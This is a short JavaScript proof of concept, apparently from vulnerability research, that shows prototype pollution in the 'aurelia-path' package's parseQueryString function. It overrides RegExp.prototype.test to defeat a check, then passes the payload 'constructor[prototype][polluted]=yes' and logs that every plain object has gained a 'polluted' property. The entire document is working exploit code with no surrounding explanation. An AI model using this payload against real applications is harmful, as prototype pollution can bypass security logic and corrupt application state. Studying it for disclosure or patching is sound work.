RegExp.prototype.test = () => true;
const ap = require('aurelia-path');
console.log({}.polluted);
ap.parseQueryString('constructor[prototype][polluted]=yes');
console.log({}.polluted);